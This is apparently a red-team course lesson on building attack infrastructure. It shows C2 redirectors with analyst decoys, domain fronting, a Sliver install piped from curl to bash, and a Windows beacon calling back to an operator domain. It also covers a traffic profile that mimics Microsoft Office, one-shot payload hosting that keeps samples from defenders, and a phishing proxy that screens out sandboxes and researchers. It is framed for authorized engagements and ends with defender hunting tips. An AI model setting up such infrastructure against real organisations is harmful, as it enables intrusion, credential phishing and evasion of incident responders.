# Building Red Team Infrastructure

A reproducible engagement infrastructure: layered redirectors, hardened C2, payload hosting, and DNS / TLS hygiene that survives a serious blue team. This lesson is the build script you wish someone had handed you.

> [!warning] Authorized engagements only
> The same infra used outside engagement scope is a CFAA / equivalent felony. Keep one infra-build per engagement, fully ephemeral, and tear it down on day-one of post-engagement.

## Architecture

![Red Team Infrastructure Architecture](/images/lessons/redteam_infra_architecture_en.png)

## 1. Acquire infrastructure

```terminal
# VPS providers known for fast spin-up + crypto pay
# (operator chooses based on jurisdiction policy)

# DNS — register through reseller that accepts Monero (Njalla, OrangeWebsite)
# Domain selection priorities:
#  - Aged (≥ 2 years), expired, drop-caught
#  - Existing reputation as benign
#  - Categorized (Talos, Symantec, Forcepoint) before use

# Verify categorization:
curl -s 'https://talosintelligence.com/sb_api/query_lookup?query=...&query_entry=login-target-365.com'
```

## 2. Harden every host (5-minute baseline)

```terminal
# Updates + minimal install
apt update && apt upgrade -y
apt install -y ufw fail2ban unattended-upgrades

# SSH — keys only, non-default port, AllowUsers
sed -i 's/^#Port 22/Port 22222/' /etc/ssh/sshd_config
sed -i 's/^#PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config
sed -i 's/^#PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
echo "AllowUsers ops" >> /etc/ssh/sshd_config
systemctl restart ssh

# Firewall — deny everything except declared
ufw default deny incoming
ufw default allow outgoing
ufw allow from <BASTION_IP> to any port 22222
ufw allow 443/tcp
ufw enable

# Fail2ban + sysctl basics
systemctl enable --now fail2ban
sysctl -w net.ipv4.tcp_syncookies=1
```

## 3. Tier-2 redirector (Apache / Nginx with malleable rules)

The redirector terminates TLS, filters traffic, and forwards only legitimate-looking C2 to the team server.

![Redirector Logic Flow](/images/lessons/redirector_logic_flow_en.png)


```terminal
# Nginx redirector with selective forwarding
server {
    listen 443 ssl http2;
    server_name cdn-target-cache.com;
    ssl_certificate     /etc/letsencrypt/live/cdn-target-cache.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/cdn-target-cache.com/privkey.pem;

    # Only forward expected URIs from expected UAs
    location ~ ^/v1/(me/photo|users/|drive/items/) {
        if ($http_user_agent !~* "MSWAC|Microsoft Office") { return 444; }
        proxy_pass https://teamserver.internal:443;
        proxy_set_header Host teamserver.internal;
    }

    # Decoy site for analysts
    location / { return 302 https://www.microsoft.com/; }
}
```

> [!tip] Decoy is half the redirector
> If a blue analyst opens your domain in a browser, they should see something boring: a Microsoft 302, a static "maintenance" page, a corporate landing clone. Never expose your real C2 root URL.

## 4. Domain fronting (where it still works)

CDNs that allow SNI/Host mismatch let your beacon talk to a high-trust front (e.g., a popular SaaS) while actually reaching your origin.

```terminal
# Test if a CDN front still permits this in 2026 — the answer changes
# CloudFront / Azure Front Door tightened over time. Some niche CDNs persist.
curl --resolve allowed-front.com:443:<CDN_IP> \
     https://allowed-front.com/ \
     -H "Host: your-cdn-distribution.cloudfront.net"
```

## 5. C2 server install (Cobalt Strike / Sliver / Mythic)

```terminal
# Sliver (open-source, modern)
curl https://sliver.sh/install | sudo bash
sliver-server daemon &

# Generate operator profile
sliver-server operator --name op1 --lhost team.internal --save op1.cfg

# From your workstation:
sliver-client import op1.cfg
sliver
> https --domain cdn-target-cache.com --lhost 0.0.0.0 --lport 443
> generate beacon --http https://cdn-target-cache.com --jitter 30 --seconds 60 \
                 --os windows --arch amd64 --format exe --save beacon.exe
```

### Beacon traffic profile (Sliver / Cobalt Strike)

Apply a profile that mimics legitimate traffic:

```c
# malleable.profile (Cobalt Strike syntax — same idea in Sliver)
http-get "/v1/me/messages" {
    client {
        header "User-Agent" "Microsoft Office/16.0";
        metadata { netbiosu; base64url; uri-append; }
    }
    server {
        header "Content-Type" "application/json";
        output { netbiosu; print; }
    }
}
sleeptime 60000;
jitter 35;
```

## 6. Payload host

Separate from C2. Payloads served once, then blackholed.

```terminal
# Caddy with one-shot URL handler (compiled with caddy-link plugin)
caddy file-server --root /srv/payloads --browse=false
# Wrap with a one-shot service so each URL works exactly once:
http://payload-host/<UUID>?key=<PRESHARED>
# Tracking middleware logs IP, UA, timestamp; deletes URL on first hit.
```

> [!info] Why one-shot
> If a defender re-pulls your payload an hour later for sandboxing, you want them to get HTTP 404, not the live malware. One-shot URLs cut analyst dwell time.

## 7. Phishing redirector

Sits in front of evilginx2 / GoPhish / Modlishka. Filters by:

- Source IP geolocation (block known sandbox/research clouds: VirusTotal, Hybrid Analysis, ANY.RUN ranges).
- User-Agent (reject curl/wget/python).
- Referer / first visit time (only first click count).
- ASN allowlist (target's known ASNs only, if known).

```terminal
# Caddy snippet
@goodclient {
    not remote_ip 8.8.8.0/24 1.1.1.0/24 13.107.0.0/16  # known scanners
    header User-Agent "Mozilla/*"
    not header User-Agent "*python*|*curl*|*HeadlessChrome*"
}
handle @goodclient { reverse_proxy https://phishlet.internal }
handle { redir https://www.microsoft.com 302 }
```

## 8. Operational hygiene

| Practice | Why |
|----------|-----|
| One engagement = one infra | Avoid cross-contamination of IOCs |
| Daily snapshots | Restore quickly if a host is suspect |
| Tear-down checklist | Wipe disks, revoke certs, destroy DNS records, archive logs encrypted |
| Logged operator actions | All commands tee'd to per-operator audit log |
| Time-boxed certificates | LE certs auto-rotate; manual certs expire by default |
| Signed code per cluster | Burning a cert burns ONE cluster, not the program |

## 9. Kill switch

Every node has a script triggered by a single signed message that:

1. Stops all C2 listeners.
2. Wipes beacon callback state.
3. Rotates SSH keys.
4. Returns redirector to decoy-only mode.

```bash
#!/bin/bash
set -e
systemctl stop sliver-server caddy
shred -uvz /opt/sliver/.sliver/teamserver.* 2>/dev/null
sed -i 's|reverse_proxy.*|return 302 https://microsoft.com|' /etc/caddy/Caddyfile
caddy reload
echo "infra parked $(date -u)" | logger -t redops
```

## Cost-discipline ballpark

| Component | $/month estimate |
|-----------|-----------------|
| Bastion + team server (4GB) | $20 |
| 3× redirector VPS (2GB) | $30 |
| 2× payload host VPS | $20 |
| 4× domains | $50 (one-time) |
| Aged domain (drop-caught) | $50–500 (one-time) |
| Code-signing cert (EV) | $300–500 (one-time) |

A capable engagement infra runs ~$100–150/month plus one-time domain/cert spend. Compare to a single 0-day at six-to-seven figures — infra is the cheap part.

## Defender's view

If you're hunting for adversary infra during IR:

- WHOIS registrant + registration date for any callout domain.
- Cert SAN list — frequently leaks more domains in the same cluster.
- Cloudflare Radar / passive DNS for the IP behind the front.
- Talos categorization history (recent re-categorization → suspicious).
- TLS JA3 / JA3S of the beacon — fingerprints C2 framework family.
- VirusTotal pivots: same TLS issuer, same favicon hash, same X.509 serial.
